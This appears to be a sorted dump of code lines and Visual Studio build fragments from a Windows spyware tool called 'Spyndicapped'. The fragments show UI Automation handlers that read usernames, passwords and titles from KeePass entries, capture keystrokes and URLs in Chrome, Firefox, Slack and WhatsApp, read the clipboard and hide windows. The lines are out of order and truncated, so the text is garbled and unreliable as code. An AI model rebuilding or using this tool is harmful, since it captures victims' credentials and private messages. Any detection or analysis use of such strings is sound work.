pAutomationElementParent = g_pMyTreeWalker->GetParent(pAutomationElementChild)
pAutomationElementReceiver)
pBranchDbTreeElement)
pBranchDbTreeElementCondition)
pChildEl)
pCondition)
pConditionToElementArrayWithoutHelpButtons)
pControlTypeCondition)
pCopyPasswordButton)
pCopyPasswordButtonCondition)
pCurrentElement = GetParent(pCurrentElement)
pDbTreeElementCondition)
pDefaultActionCondition)
pDropDownMenu)
pDropDownMenuCondition)
pElementArray)
pElementArrayWithoutHelpButtons)
pElementArrayWithoutHelpButtons->get_Length(
pElementsArray)
pElementsArray->get_Length(
pEntryChild)
pEntryChildNotesElement)
pEntryChildPasswordElement)
pEntryChildTitleElement)
pEntryChildUrlElement)
pEntryChildUsernameElement)
pEntryElement)
pFoundElement)
pInvokePattern)
pInvokePattern->Invoke()
pInvokePatternCondition)
pMainWindow)
pMainWindowCondition)
pMyAutomationEventHandler->SetEventTimeout(timeout)
pMyPropertyChangedEventHandler->SetEventTimeout(timeout)
pOverlayWnd = CreateWindowEx(
pParent)
pPassListCondition)
pRootElement)
pScrollItemPatternCondition)
pTargetElement)
pTrueCondition)
pWalker = g_pMyTreeWalker->GetPTreeWalker()
pWalker)
pWalker->Release()
ppInterface = NULL
ppInterface = static_cast<IUIAutomationEventHandler
ppInterface = static_cast<IUIAutomationPropertyChangedEventHandler
ppInterface = static_cast<IUnknown
pragma once
previousDb = SysAllocString(bDbName)
private:
process_id)
propertyChangedThread.join()
propertyIds[i])
public:
rect)
refCount)
resx
return
return -1
return 0
return 1
return ERROR_SUCCESS
return E_ABORT
return E_APPLICATION_VIEW_EXITING
return E_INVALIDARG
return E_NOINTERFACE
return E_POINTER
return FALSE
return InterlockedIncrement(
return NULL
return S_OK
return TRUE
return V_I4(
return domain
return eventCount
return fullPath
return fullPath.substr(lastSlashPos 
return hash
return it->second
return nullptr
return oss.str()
return output
return pAutomation
return pAutomationElement
return pFoundElement
return pMainWindow
return pParent
return pWalker
return refCount
return std::wstring(moduleName)
return this->eventTimeout
shell
static DWORD GetPIDByUIAutomationElement(IUIAutomationElement
static HRESULT GetClipBoardData(std::wstring
static HRESULT STDMETHODCALLTYPE Deploy(IUIAutomation
static IUIAutomationElement
static ULONG DisplayActiveWindows()
static class Finder {
static std::wstring ControlTypeIdToString(CONTROLTYPEID controlTypeId)
static std::wstring ConvertToLower(const std::wstring
static std::wstring EventIdToString(EVENTID eventID)
static std::wstring GetApplicationName(const std::wstring
static std::wstring GetCurrentDateTime()
static std::wstring GetDomainFromUrl(const std::wstring
static std::wstring GetModuleNameFromPid(DWORD pid)
static std::wstring HandleVariant(VARIANT vVar)
static uint32_t hash(const std::wstring
static void HideWindow(HWND hwnd)
static void RemoveOverlay(HWND)
std::chrono::seconds MyAutomationEventHandler::GetEventTimeout()
std::chrono::seconds MyPropertyChangedEventHandler::GetEventTimeout()
std::chrono::seconds STDMETHODCALLTYPE GetEventTimeout()
std::chrono::seconds eventTimeout = std::chrono::seconds(1)
std::chrono::steady_clock::time_point lastEventTime
std::mutex logMutex
std::thread automationThread
std::thread propertyChangedThread
std::time_t now_c = std::chrono::system_clock::to_time_t(now)
std::tm localTime
std::vector<EVENTID> eventIds = {
std::vector<int> propertyIds = {
std::wostringstream oss
std::wstring Finder::GetModuleNameFromPid(DWORD pid) {
std::wstring Helpers::ControlTypeIdToString(CONTROLTYPEID controlTypeId)
std::wstring Helpers::ConvertToLower(const std::wstring
std::wstring Helpers::EventIdToString(EVENTID eventID) {
std::wstring Helpers::GetApplicationName(const std::wstring
std::wstring Helpers::GetCurrentDateTime() {
std::wstring Helpers::GetDomainFromUrl(const std::wstring
std::wstring Helpers::HandleVariant(VARIANT vVar) {
std::wstring domain = url
std::wstring output = input
std::wstring wsDate = Helpers::GetCurrentDateTime()
std::wstring wsEventString = Helpers::EventIdToString(eventID)
std::wstring wsFileName = Finder::GetModuleNameFromPid(pid)
std::wstring wsLogKeyStroke = wsDate 
std::wstring wsProcName = Helpers::GetApplicationName(wsFileName)
struct HANDLEDATA {
switch (eventID)
switch (eventID) {
switch (propId) {
t Spyndicapped.exe spy --window 
this->AddRef()
this->eventTimeout = std::chrono::seconds(seconds)
tiff
uint32_t Helpers::hash(const std::wstring
uint32_t hash = 5381
unsigned long pid
unsigned long process_id = 0
vAriaRoleValue)
vAutomationId)
vAutomationId.vt = VT_BSTR
vHelp)
vIAccessibleRoleValue)
vMsgValue)
vPid)
vPid) == VT_I4)
vUrlBar)
vValue)
vWindowName)
vWindowName.bstrVal = SysAllocString(windowName)
vWindowName.vt = VT_BSTR
void HandleChrome(IUIAutomationElement
void HandleExplorer(IUIAutomationElement
void HandleFirefox(IUIAutomationElement
void HandleKeepass(IUIAutomationElement
void HandleOther(IUIAutomationElement
void HandleSlackFF(IUIAutomationElement
void HandleWhatsAppFF(IUIAutomationElement
void Helpers::HideWindow(HWND hwnd)
void Helpers::RemoveOverlay(HWND hwnd)
void Log(const std::wstring
void MyAutomationEventHandler::HandleExplorer(IUIAutomationElement
void MyAutomationEventHandler::HandleFirefox(IUIAutomationElement
void MyAutomationEventHandler::HandleOther(IUIAutomationElement
void MyAutomationEventHandler::HandleSlackFF(IUIAutomationElement
void MyAutomationEventHandler::HandleWhatsAppFF(IUIAutomationElement
void MyPropertyChangedEventHandler::HandleChrome(IUIAutomationElement
void MyPropertyChangedEventHandler::HandleKeepass(IUIAutomationElement
void MyPropertyChangedEventHandler::HandleOther(IUIAutomationElement
void PrintErrorFromHRESULT(HRESULT hr)
void PrintErrorFromHRESULT(HRESULT hr) {
void STDMETHODCALLTYPE IncrementEventCount()
void STDMETHODCALLTYPE MyAutomationEventHandler::SetEventTimeout(int seconds)
void STDMETHODCALLTYPE MyPropertyChangedEventHandler::SetEventTimeout(int seconds)
void STDMETHODCALLTYPE SetEventTimeout(int)
void ShowAwesomeBanner() {
void ShowHelp()
wchar_t
wchar_t moduleName[MAX_PATH]
while (1) {}
while (1){}
while (pFoundElement == NULL) {
while (true) {
wsControlType = Helpers::ControlTypeIdToString(ctId)
wsDomain = Helpers::GetDomainFromUrl(vUrlBar.bstrVal)
wsLogKeyStroke 
wsLogKeyStroke = wsDate 
wsUrl = std::wstring(vUrlBar.bstrVal)
x64 = Debug
x64 = Release
x64.ActiveCfg = Debug
x64.ActiveCfg = Release
x64.Build.0 = Debug
x64.Build.0 = Release
x86 = Debug
x86 = Release
x86.ActiveCfg = Debug
x86.ActiveCfg = Release
x86.Build.0 = Debug
x86.Build.0 = Release
xsd</Extensions>
{CD9C66C8-8FCB-4D43-975B-A9C8D02AD090}.Debug
{CD9C66C8-8FCB-4D43-975B-A9C8D02AD090}.Release
